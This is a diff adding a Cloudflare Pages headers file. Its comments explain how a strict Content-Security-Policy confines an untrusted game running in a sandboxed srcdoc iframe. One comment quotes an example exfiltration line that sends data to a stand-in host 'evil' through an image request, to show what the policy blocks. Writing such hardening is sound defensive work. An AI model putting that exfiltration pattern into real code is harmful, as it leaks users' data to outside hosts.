@@ -1,0 +1,43 @@
+# Edge headers for Cloudflare Pages. Copied verbatim into dist/ by Vite.
+#
+# The load-bearing one is the CSP, and the reason it works is subtle: a srcdoc
+# document *inherits the embedding page's policy*. So this policy is also the
+# policy the untrusted game runs under -- and because the game frame is
+# sandboxed without allow-same-origin, its origin is opaque, and an opaque
+# origin matches no `'self'` at all. Every origin-based directive below
+# therefore collapses to `'none'` inside the game:
+#
+#   connect-src 'self'  ->  the game can fetch/XHR/WebSocket/beacon nowhere
+#   img-src 'self' ...  ->  no `new Image().src = 'https://evil/?' + data`
+#   script-src 'self'   ->  no import() of remote code; the QR really is the game
+#
+# That is what closes the exfiltration and remote-loader gaps the sandbox
+# attribute alone leaves open.
+#
+# `'unsafe-inline'` is required because the harness and the game itself are
+# inline <script> tags in the srcdoc document, and inheritance means the parent
+# must permit what the child needs. It is an acceptable trade only because no
+# page here has an HTML injection sink -- there is no innerHTML, document.write,
+# insertAdjacentHTML, eval or new Function anywhere in src/. Keep it that way.
+#
+# `'wasm-unsafe-eval'` is not optional: Brotli is WebAssembly, and compiling a
+# module is blocked outright without it.
+#
+# Clickjacking is handled by X-Frame-Options rather than frame-ancestors,
+# because frame-ancestors would be inherited by the game frame too and is not
+# what you want applied to a document you are deliberately framing.
+#
+# `npm run check:headers` serves dist/ under these exact rules and runs the e2e
+# suite against it, so this file is tested rather than assumed.
+
+/*
+  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' blob: data:; font-src 'self'; connect-src 'self'; worker-src 'self' blob:; child-src 'self' blob:; frame-src 'self'; media-src 'self' blob: data:; object-src 'none'; base-uri 'none'; form-action 'none'
+  X-Frame-Options: DENY
+  X-Content-Type-Options: nosniff
+  Referrer-Policy: no-referrer
+  Cross-Origin-Opener-Policy: same-origin
+  Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=(), midi=(), serial=(), bluetooth=(), hid=()
+
+# Hashed assets are immutable; the HTML entry points must never be.
+/assets/*
+  Cache-Control: public, max-age=31536000, immutable
